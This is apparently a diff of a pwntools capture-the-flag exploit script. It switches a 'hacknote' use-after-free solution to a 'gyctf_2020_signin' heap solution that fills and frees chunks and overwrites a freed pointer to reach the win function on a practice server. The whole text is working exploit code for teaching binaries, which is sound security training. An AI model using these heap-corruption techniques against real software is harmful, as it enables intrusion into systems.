@@ -27,31 +27,48 @@ uu32    = lambda data               :u32(data.ljust(4,'\0'))
 uu64    = lambda data               :u64(data.ljust(8,'\0'))
 leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
 
-context(arch='i386', os='linux', log_level = 'DEBUG')
-binary = './hacknote'
+context.log_level = 'DEBUG'
+binary = './gyctf_2020_signin'
+context.binary = binary
 elf = ELF(binary)
-p = remote('node3.buuoj.cn',27548) if argv[1]=='r' else process(binary)
+p = remote('node3.buuoj.cn',28320) if argv[1]=='r' else process(binary)
+libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+#libc = ELF('./glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so')
 
-# start
-def add(size,name='a'):
-	sla(':','1')
-	sla(':',str(size))
-	sla(':',name)
+def dbg():
+	gdb.attach(p)
+	pause()
 
-def delete(index):
-	sla(':','2')
-	sla(':',str(index))
+_add,_free,_edit,_show = 1,3,2,4
+def add(index):
+	sla('?',str(_add))
+	sla('?',str(index))
+
+def free(index):
+	sla('?',str(_free))
+	sla('?',str(index))
+
+def edit(index,content):
+	sla('?',str(_edit))
+	sla('?',str(index))
+	s(content)
 
 def show(index):
-	sla(':','3')
+	sla(':',str(_show))
 	sla(':',str(index))
 
-add(0x10)
-add(0x10)
-delete(0)
-delete(1)
-add(0x8,p32(elf.sym['magic']))
-show(0)
+# start
+for i in range(8):
+	add(i)
+for i in range(8):
+	free(i)
+
+dbg()
+edit(7,p64(0x4040c0-0x10))
+add(8)
+dbg()
+sla('?','6')
+dbg()
 # end
 
 itr()
